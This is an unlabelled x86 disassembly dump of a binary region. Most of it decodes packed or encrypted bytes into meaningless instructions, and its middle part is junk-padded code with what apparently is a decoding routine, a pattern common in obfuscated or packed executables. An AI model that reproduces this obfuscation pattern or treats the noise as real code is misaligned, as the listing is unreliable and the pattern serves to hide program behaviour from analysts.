  404c17:	jo     0x404c3e
  404c19:	jnp    0x404bfc
  404c1b:	or     BYTE PTR [ecx],dl
  404c1d:	mov    ebx,0x70362e35
  404c22:	push   esp
  404c23:	sbb    edx,DWORD PTR [edi-0x64]
  404c26:	mov    DWORD PTR [ebp+0x3e],esp
  404c29:	xor    ebp,DWORD PTR [ebx+0x134ef15b]
  404c2f:	jno    0x404c76
  404c31:	mov    dh,0x6c
  404c33:	enter  0x6549,0x33
  404c37:	sub    esp,0xbb5f3814
  404c3d:	retf   
  404c3e:	and    al,0x1a
  404c40:	xchg   esi,eax
  404c41:	xchg   ebp,eax
  404c42:	add    al,dl
  404c44:	add    dh,bl
  404c46:	push   ss
  404c47:	not    DWORD PTR [ebp+eiz*8-0x28]
  404c4b:	mov    ch,0x4b
  404c4d:	out    0x8a,eax
  404c4f:	popa   
  404c50:	push   0xe5762050
  404c55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c56:	or     BYTE PTR [edi+0x129fdd52],ah
  404c5c:	sbb    eax,0x6d78ce52
  404c61:	xor    ebx,DWORD PTR [esi-0x6]
  404c64:	mov    bl,0xb7
  404c66:	mov    DWORD PTR [ebp-0x4a],0x4d57f1a0
  404c6d:	retf   0xc32d
  404c70:	das    
  404c71:	dec    eax
  404c72:	or     eax,0x817b0aca
  404c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c78:	jne    0x404cab
  404c7a:	aad    0xea
  404c7c:	sub    DWORD PTR [ebx+edx*2-0x72],ebx
  404c80:	test   DWORD PTR [esi],ebp
  404c82:	shr    DWORD PTR [esi+ebx*1-0x4884ff8c],1
  404c89:	in     al,0xc0
  404c8b:	mov    WORD PTR [edx+ebp*1+0x726d6752],cs
  404c92:	pop    ecx
  404c93:	and    BYTE PTR [edi-0x58f2d4d],cl
  404c99:	div    DWORD PTR [ecx+0x18a36e1c]
  404c9f:	data16 outs dx,BYTE PTR ds:[esi]
  404ca1:	cld    
  404ca2:	add    edi,DWORD PTR [ebp+0x544e83a9]
  404ca8:	pop    eax
  404ca9:	arpl   WORD PTR [ebp-0x1a016d10],bp
  404caf:	shr    DWORD PTR [ebp+0x6c],0x56
  404cb3:	cwde   
  404cb4:	repnz xor al,0xcb
  404cb7:	sub    esp,DWORD PTR [esi-0x7b]
  404cba:	push   ss
  404cbb:	push   es
  404cbc:	mov    ecx,0xbcb66c61
  404cc1:	jno    0x404d39
  404cc3:	(bad)  
  404cc4:	mov    cl,0xfa
  404cc6:	rcl    BYTE PTR [edi],0xa9
  404cc9:	adc    eax,0x7360b0b0
  404cce:	adc    BYTE PTR [edx],bh
  404cd0:	lds    edi,FWORD PTR [esi-0x3d9712b3]
  404cd6:	push   ecx
  404cd7:	fbstp  TBYTE PTR [ebx+0x5c]
  404cda:	inc    edi
  404cdb:	sub    DWORD PTR [esi+0x3f1a4d0d],0x47616ee4
  404ce5:	mov    WORD PTR [eax],ss
  404ce7:	sub    bh,bh
  404ce9:	and    ebp,DWORD PTR [ebp-0x42]
  404cec:	ds inc edx
  404cee:	loope  0x404d18
  404cf0:	call   0x1dfe:0x671b76e9
  404cf7:	mov    esi,0xe7fbcda1
  404cfc:	(bad)  
  404cfd:	lmsw   WORD PTR [esp+edx*8]
  404d01:	inc    ebx
  404d02:	and    BYTE PTR fs:[edi-0x65],dl
  404d06:	mov    eax,0xe280046
  404d0b:	xor    eax,0x9f4719e
  404d10:	ds mov bl,0x79
  404d13:	pop    es
  404d14:	daa    
  404d15:	es xchg ebp,eax
  404d17:	call   0x605c5497
  404d1c:	jg     0x404d1b
  404d1e:	out    dx,al
  404d1f:	shr    DWORD PTR [ebp+0x4adb785],0xcd
  404d26:	data16 div BYTE PTR [ebx]
  404d29:	shl    DWORD PTR [edi-0x6890f289],0x1b
  404d30:	mov    BYTE PTR [esi+0x61],bh
  404d33:	jo     0x404d1d
  404d35:	shl    ecx,cl
  404d37:	mov    esp,DWORD PTR [esi+0x5a]
  404d3a:	add    al,0x0
  404d3c:	cmp    al,0x39
  404d3e:	and    DWORD PTR [ebx],esi
  404d40:	cld    
  404d41:	inc    ecx
  404d42:	clc    
  404d43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d44:	pop    es
  404d45:	std    
  404d46:	icebp  
  404d47:	mov    bh,BYTE PTR [ebx-0x51]
  404d4a:	je     0x404db8
  404d4c:	push   esp
  404d4d:	cdq    
  404d4e:	idiv   cl
  404d50:	cwde   
  404d51:	clc    
  404d52:	sbb    bh,bl
  404d54:	push   esi
  404d55:	mov    dl,0xf7
  404d57:	outs   dx,DWORD PTR ds:[esi]
  404d58:	sub    al,0x55
  404d5a:	loopne 0x404d56
  404d5c:	fsub   DWORD PTR [edx+0x51]
  404d5f:	aaa    
  404d60:	fimul  WORD PTR [ebx+0x329093d1]
  404d66:	cmp    al,0x96
  404d68:	fdivr  DWORD PTR [edx-0x43]
  404d6b:	xchg   ebp,eax
  404d6c:	nop
  404d6d:	fstp   QWORD PTR [ebx+0xe]
  404d70:	xor    dh,BYTE PTR [ecx-0x169d5882]
  404d76:	and    DWORD PTR [edx+0x6e0d5f7f],0x65d97a4a
  404d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d81:	mov    ecx,0xa06cf4c7
  404d86:	jmp    0x404d52
  404d88:	call   0xd51f:0xa23e7263
  404d8f:	mov    ?,WORD PTR [edi+eax*1]
  404d92:	cmp    edx,DWORD PTR [edx-0x5e3a4015]
  404d98:	jge    0x404d85
  404d9a:	retf   0x11cb
  404d9d:	fucom  st(1)
  404d9f:	fcomp  DWORD PTR [edx]
  404da1:	sub    al,0x9e
  404da3:	js     0x404e23
  404da5:	shl    DWORD PTR [edi-0x6e877c67],0x17
  404dac:	pusha  
  404dad:	jge    0x404dd8
  404daf:	dec    edi
  404db0:	jb     0x404d82
  404db2:	sbb    esp,DWORD PTR [ebx]
  404db4:	cmp    dh,BYTE PTR [ebx]
  404db6:	push   esi
  404db7:	push   eax
  404db8:	inc    esi
  404db9:	pop    ebx
  404dba:	sbb    al,0x2a
  404dbc:	mov    dl,0x1b
  404dbe:	stos   DWORD PTR es:[edi],eax
  404dbf:	cmp    cl,al
  404dc1:	inc    edx
  404dc2:	push   ebx
  404dc3:	shl    BYTE PTR [edi],1
  404dc5:	xchg   edx,eax
  404dc6:	loop   0x404d71
  404dc8:	dec    edx
  404dc9:	loop   0x404d89
  404dcb:	test   al,0xad
  404dcd:	sub    esi,DWORD PTR [eax-0x77]
  404dd0:	popf   
  404dd1:	sub    BYTE PTR [edx+eax*2-0x58],ch
  404dd5:	mov    ebp,0x5775609c
  404dda:	pop    esi
  404ddb:	push   0xb
  404ddd:	out    dx,al
  404dde:	in     al,dx
  404ddf:	gs aad 0xf
  404de2:	nop
  404de3:	outs   dx,DWORD PTR ds:[esi]
  404de4:	and    edx,DWORD PTR [edx+0x5]
  404de7:	pop    edi
  404de8:	xchg   ecx,eax
  404de9:	outs   dx,DWORD PTR ds:[esi]
  404dea:	jge    0x404dd1
  404dec:	push   0x48bf17c1
  404df1:	cmc    
  404df2:	xor    al,0xe3
  404df4:	imul   ebx,DWORD PTR [eax+0x2a],0xffffffc8
  404df8:	retf   
  404df9:	pop    ebx
  404dfa:	pop    edi
  404dfb:	shl    WORD PTR [ebp-0x55],1
  404dff:	pop    ebx
  404e00:	sbb    DWORD PTR [edx],esp
  404e02:	push   ss
  404e03:	div    BYTE PTR [eax-0x1a63b7f]
  404e09:	pop    es
  404e0a:	inc    esp
  404e0b:	pushf  
  404e0c:	push   ds
  404e0d:	scas   eax,DWORD PTR es:[edi]
  404e0e:	arpl   WORD PTR [eax],cx
  404e10:	jbe    0x404e80
  404e12:	jmp    0x994f013c
  404e17:	adc    dl,0x83
  404e1a:	xchg   ebp,eax
  404e1b:	xchg   ebx,eax
  404e1c:	sub    eax,0xf1cf99d9
  404e21:	(bad)  
  404e22:	loopne 0x404de0
  404e24:	sbb    eax,0xa3721b4
  404e29:	stos   BYTE PTR es:[edi],al
  404e2a:	jno    0x404de6
  404e2c:	shr    DWORD PTR [ecx],1
  404e2e:	lock ror DWORD PTR [ebx-0x217058f0],1
  404e35:	fwait
  404e36:	stos   BYTE PTR es:[edi],al
  404e37:	push   ebx
  404e38:	and    al,BYTE PTR [edi-0x29]
  404e3b:	into   
  404e3c:	or     al,0x26
  404e3e:	addr16 jge 0x404e27
  404e41:	(bad)  
  404e42:	rol    BYTE PTR [esi+0x73],cl
  404e45:	data16 fidivr DWORD PTR [ecx]
  404e48:	sub    DWORD PTR [ebx],edi
  404e4a:	push   es
  404e4b:	aas    
  404e4c:	aad    0x5d
  404e4e:	cli    
  404e4f:	sub    edx,esp
  404e51:	xor    ecx,edx
  404e53:	outs   dx,BYTE PTR ds:[esi]
  404e54:	pushf  
  404e55:	repnz add eax,0x7c137fc6
  404e5b:	stc    
  404e5c:	imul   edi,DWORD PTR [eax-0xefaadba],0xb4a004e0
  404e66:	sub    ebx,ecx
  404e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e69:	cs jmp 0x404e06
  404e6c:	or     DWORD PTR [edi+0x76],0xea5684ff
  404e73:	sar    edx,cl
  404e75:	ret    
  404e76:	sub    bl,BYTE PTR [edi-0x5]
  404e79:	enter  0x443b,0xb1
  404e7d:	adc    BYTE PTR [ebx],bh
  404e7f:	sbb    al,0x3
  404e81:	test   al,0x54
  404e83:	mov    bl,0x9
  404e85:	mov    esi,esp
  404e87:	jl     0x404e57
  404e89:	dec    ecx
  404e8a:	out    0x23,al
  404e8c:	pop    ds
  404e8d:	fsubr  QWORD PTR [edx-0x6fabadbb]
  404e93:	outs   dx,BYTE PTR ds:[esi]
  404e94:	mov    al,0x76
  404e96:	fcom   st(0)
  404e98:	call   0x1a53bfcc
  404e9d:	scas   eax,DWORD PTR es:[edi]
  404e9e:	call   0xf06d:0xf526c7b7
  404ea5:	sub    BYTE PTR ds:0xe54b8c79,ch
  404eab:	jmp    0xffe61b6e
  404eb0:	push   edx
  404eb1:	enter  0xf873,0x25
  404eb5:	adc    al,BYTE PTR fs:[edi]
  404eb8:	aas    
  404eb9:	mov    bl,0xf6
  404ebb:	lds    edx,FWORD PTR [edx-0xf98a061]
  404ec1:	xor    BYTE PTR [edi],dh
  404ec3:	and    BYTE PTR [ebx+0x47],bl
  404ec6:	pop    ecx
  404ec7:	mov    ecx,0xad5406fb
  404ecc:	cdq    
  404ecd:	daa    
  404ece:	mov    eax,0xc4ab5c47
  404ed3:	outs   dx,BYTE PTR ds:[esi]
  404ed4:	mov    dh,0x91
  404ed6:	add    cl,BYTE PTR [ebp+0x34]
  404ed9:	inc    edi
  404eda:	in     eax,0x5d
  404edc:	pop    eax
  404edd:	cmp    ecx,DWORD PTR [eax-0x4f]
  404ee0:	repnz inc ecx
  404ee2:	aam    0xaf
  404ee4:	out    dx,al
  404ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ee6:	les    eax,FWORD PTR [esi]
  404ee8:	pusha  
  404ee9:	sti    
  404eea:	xchg   esi,eax
  404eeb:	and    edx,DWORD PTR [edx]
  404eed:	dec    edx
  404eee:	aam    0x8f
  404ef0:	dec    eax
  404ef1:	aam    0xc2
  404ef3:	(bad)  
  404ef4:	in     al,0xa6
  404ef6:	pop    esp
  404ef7:	mov    al,0x3a
  404ef9:	lods   al,BYTE PTR ds:[esi]
  404efa:	in     al,0x5e
  404efc:	repnz imul ebp,DWORD PTR [ebx+eiz*2+0x45],0x42a7ee1c
  404f05:	fs xchg ebp,eax
  404f07:	les    ebp,FWORD PTR [ecx-0x35]
  404f0a:	push   edi
  404f0b:	out    dx,eax
  404f0c:	sbb    al,0x3
  404f0e:	jle    0x404efe
  404f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f11:	push   ecx
  404f12:	stos   DWORD PTR es:[edi],eax
  404f13:	jno    0x404e9d
  404f15:	xchg   edx,eax
  404f16:	sbb    al,0x19
  404f18:	scas   al,BYTE PTR es:[edi]
  404f19:	leave  
  404f1a:	mov    edi,0xe1217f1d
  404f1f:	(bad)  
  404f20:	test   BYTE PTR [ecx],ch
  404f22:	add    ch,bl
  404f24:	jae    0x404ef5
  404f26:	enter  0xc3e5,0x88
  404f2a:	xor    al,BYTE PTR [ebp-0x7e1baaf5]
  404f30:	sbb    eax,0x42823b
  404f35:	push   esi
  404f36:	je     0x404f38
  404f38:	add    cl,al
  404f3a:	loope  0x404f5a
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x428247
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x42835b,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x428337,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x428343,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x428343,0x0
  404f72:	mov    DWORD PTR ds:0x4282d3,ebx
  404f78:	mov    DWORD PTR ds:0x42834b,0x56b3
  404f82:	mov    DWORD PTR ds:0x42822b,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x4281ff,ebx
  404f97:	mov    DWORD PTR ds:0x428237,0x5683
  404fa1:	cmp    DWORD PTR ds:0x428343,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428d4c
  404fbc:	and    edx,DWORD PTR ds:0x4282e3
  404fc2:	sub    DWORD PTR ds:0x42820f,ecx
  404fc8:	or     DWORD PTR ds:0x428203,0xf0b
  404fd2:	adc    DWORD PTR ds:0x42813f,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x428323
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x42812b,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x428123
  404ff2:	xor    DWORD PTR ds:0x428263,edx
  404ff8:	mov    edx,DWORD PTR ds:0x428237
  404ffe:	add    DWORD PTR ds:0x42835b,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x428263
  40500c:	add    DWORD PTR ds:0x42823b,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x428343,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x42834f,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x428137,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x42835f,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x42824f,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x428143,0x428227
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x42833b,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x42834b,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x42823b,0x428347
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x428233,0x428253
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428207,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x42833b,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x42834b,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x428357,0x4281fb
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x428223,0x42820f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x42825f,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x42823f,0x42821b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x428127,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x42834b,0x0
  40512f:	mov    DWORD PTR ds:0x42815b,edx
  405135:	mov    DWORD PTR ds:0x42832b,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x42813b,0x795c
  40514c:	cmp    DWORD PTR ds:0x42834b,0x0
  405153:	ja     0x40517c
  405159:	push   0x427f6c
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428d74
  40516c:	or     DWORD PTR ds:0x428233,0xa87
  405176:	add    ecx,DWORD PTR ds:0x428367
  40517c:	adc    ecx,DWORD PTR ds:0x42814b
  405182:	xor    DWORD PTR ds:0x42813b,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x42824f,edx
  405192:	cmp    DWORD PTR ds:0x4282ab,0x0
  405199:	mov    DWORD PTR ds:0x4282d7,0x66a6
  4051a3:	mov    DWORD PTR ds:0x4282b7,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x4282ab,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428d78
  4051d1:	inc    DWORD PTR ds:0x428247
  4051d7:	mov    ecx,DWORD PTR ds:0x428187
  4051dd:	mov    edx,DWORD PTR ds:0x428387
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x4282ab,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x42817f
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x428233,edx
  405201:	mov    edx,DWORD PTR ds:0x428197
  405207:	mov    ecx,DWORD PTR ds:0x428387
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x42833f,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x42824f
  405233:	sub    DWORD PTR ds:0x428153,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x42832b,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x428137,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x42823f,0x428143
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x42835b,0x428227
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x428353,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x42812b,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x428263,0x0
  40529a:	mov    DWORD PTR ds:0x4281f3,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x428233
  4052aa:	mov    DWORD PTR ds:0x4282bb,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x428363,0x6b40
  4052c3:	mov    DWORD PTR ds:0x42824b,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x428263,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x428029
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428d7c
  4052ea:	add    edx,DWORD PTR ds:0x42821b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x428143
  4052fc:	and    DWORD PTR ds:0x42814f,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x428227
  40530f:	add    DWORD PTR ds:0x428263,edx
  405315:	mov    edx,DWORD PTR ds:0x42824b
  40531b:	add    DWORD PTR ds:0x428133,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x4282b7,0x4281ef
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x4282d3,0x0
  40533c:	mov    DWORD PTR ds:0x4282cf,edi
  405342:	mov    DWORD PTR ds:0x428237,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x4282db,0x4d36
  405357:	mov    DWORD PTR ds:0x428357,0x1e95
  405361:	cmp    DWORD PTR ds:0x4282d3,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428d80
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x42835f,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x42839f
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x42833f,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42820f
  40539c:	xor    DWORD PTR ds:0x42811b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x42823b,edx
  4053ae:	cmp    DWORD PTR ds:0x4282bb,0x0
  4053b5:	mov    DWORD PTR ds:0x428127,edi
  4053bb:	not    DWORD PTR ds:0x4281fb
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x428157,0xab0
  4053d0:	cmp    DWORD PTR ds:0x4282bb,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428d84
  4053f6:	sub    ecx,DWORD PTR ds:0x42815b
  4053fc:	sub    DWORD PTR ds:0x4281fb,0x6432
  405406:	or     DWORD PTR ds:0x42821f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x42814f
  405416:	sub    DWORD PTR ds:0x428353,edi
  40541c:	mov    DWORD PTR ds:0x4281fb,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x428237,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x4282af,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x42835f
  405450:	sub    edx,DWORD PTR ds:0x428113
  405456:	mov    DWORD PTR ds:0x42835f,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	add    cl,BYTE PTR [ecx]
  40546f:	pop    ecx
  405470:	stos   BYTE PTR es:[edi],al
  405471:	out    0xb9,al
  405473:	sbb    BYTE PTR [eax],bl
  405475:	sahf   
  405476:	adc    bl,BYTE PTR [eax]
  405478:	sbb    BYTE PTR [ecx],bl
  40547a:	pushf  
  40547b:	adc    DWORD PTR [edi],esp
  40547d:	out    0x26,eax
  40547f:	sti    
  405480:	les    edi,FWORD PTR ds:0x8ba0808e
  405486:	pop    DWORD PTR [ebp+edx*4+0x64]
  40548a:	das    
  40548b:	sub    bl,BYTE PTR [esi-0x1]
  40548e:	cmp    edx,DWORD PTR [edi+ecx*8+0x1b70401e]
  405495:	pop    ebx
  405496:	xor    eax,0xb117e887
  40549b:	xchg   edi,eax
  40549c:	std    
  40549d:	pop    ss
  40549e:	mov    ds:0x28c191a8,al
  4054a3:	aad    0x35
  4054a5:	call   FWORD PTR [ecx+eiz*4+0x7c6da867]
  4054ac:	aad    0xa4
  4054ae:	mov    cl,0x68
  4054b0:	mov    ch,0x3b
  4054b2:	mov    al,ds:0x412eba12
  4054b7:	loope  0x4054b2
  4054b9:	sbb    eax,DWORD PTR [ebx]
  4054bb:	mov    gs,WORD PTR [esi-0x5abec5c]
  4054c1:	cs mov edi,0xb3cb0dfe
  4054c7:	in     al,dx
  4054c8:	les    eax,FWORD PTR [eax-0x68e97ce5]
  4054ce:	in     eax,dx
  4054cf:	stos   BYTE PTR es:[edi],al
  4054d0:	xor    esi,edx
  4054d2:	jmp    0x40545b
  4054d4:	jmp    0x405474
  4054d6:	add    eax,0xdeac0344
  4054db:	test   BYTE PTR [edx+0x30],al
  4054de:	mov    eax,0x77b847cf
  4054e3:	add    DWORD PTR [edi],esi
  4054e5:	stc    
  4054e6:	adc    eax,0x23f7cae4
  4054eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054ec:	and    edx,DWORD PTR [ebp+0x61c9d363]
  4054f2:	cmp    DWORD PTR [eax+0x7e806e37],eax
  4054f8:	push   ss
  4054f9:	xchg   BYTE PTR [edi-0x694d0461],bh
  4054ff:	popf   
  405500:	dec    edi
  405501:	sbb    al,0xbc
  405503:	jp     0x405491
  405505:	and    al,0x95
  405507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405508:	mov    cl,0xf7
  40550a:	sar    BYTE PTR [ebx-0x7b],cl
  40550d:	icebp  
  40550e:	mov    ebp,DWORD PTR [ebp-0x8b35c35]
  405514:	xchg   ecx,eax
  405515:	fsubr  QWORD PTR [edx-0x55f6b043]
  40551b:	inc    edx
  40551c:	lods   al,BYTE PTR ds:[esi]
  40551d:	lahf   
  40551e:	inc    edi
  40551f:	pop    esp
  405520:	into   
  405521:	pop    ss
  405522:	push   edi
  405523:	loopne 0x40559c
  405525:	ja     0x405590
  405527:	dec    edx
  405528:	sub    eax,0x4cca6d09
  40552d:	rcr    DWORD PTR [ebp+0xa],1
  405530:	cs arpl sp,ax
  405533:	cmp    eax,0x3f720576
  405538:	mov    WORD PTR [edi],?
  40553a:	call   0x6be8:0xaf699b4a
  405541:	push   ecx
  405542:	cmp    edi,DWORD PTR [esi+0x3f8f36a2]
  405548:	sbb    DWORD PTR ds:0xb6d11d5b,ebp
  40554e:	inc    esp
  40554f:	sbb    edx,DWORD PTR [ebx-0x47]
  405552:	or     al,0x69
  405554:	jne    0x4054e5
  405556:	sbb    BYTE PTR [ecx],al
  405558:	lods   al,BYTE PTR ds:[esi]
  405559:	or     al,0x1f
  40555b:	xchg   esi,eax
  40555c:	mov    edx,0xdd2692aa
  405561:	adc    eax,0x25c0ae6d
  405566:	add    BYTE PTR [eax+edx*4-0x9],bl
  40556a:	repz fs (bad) 
  40556d:	and    esp,DWORD PTR [esi]
  40556f:	and    ah,BYTE PTR [edx]
  405571:	retf   
  405572:	aam    0xab
  405574:	shl    DWORD PTR [edx-0x2e],1
  405577:	xchg   BYTE PTR ds:0xf61831d8,bl
  40557d:	stos   BYTE PTR es:[edi],al
  40557e:	mov    BYTE PTR [esi-0x50],dh
  405581:	in     al,0x22
  405583:	loopne 0x405550
  405585:	or     al,0x6b
  405587:	ss xchg ecx,eax
  405589:	cmc    
  40558a:	jne    0x405576
  40558c:	loopne 0x405545
  40558e:	add    ebp,esp
  405590:	push   0x26
  405592:	out    dx,al
  405593:	dec    esi
  405594:	mov    bl,0x83
  405596:	lahf   
  405597:	mov    cl,BYTE PTR ds:0x83418759
  40559d:	jbe    0x4055ee
  40559f:	add    al,0x82
  4055a1:	ror    edi,1
  4055a3:	lods   eax,DWORD PTR ds:[esi]
  4055a4:	xor    BYTE PTR [esi-0x4f],0x68
  4055a8:	mov    edi,0x35013272
  4055ad:	ins    BYTE PTR es:[edi],dx
  4055ae:	lahf   
  4055af:	dec    ebx
  4055b0:	cmp    edi,DWORD PTR ds:0x2ac70cff
  4055b6:	and    DWORD PTR [eax],edx
  4055b8:	add    BYTE PTR [ecx-0x1d],dl
  4055bb:	nop
  4055bc:	mov    BYTE PTR [edx+ebp*4+0x5a],al
  4055c0:	push   ds
  4055c1:	mov    al,ds:0xc9142c7d
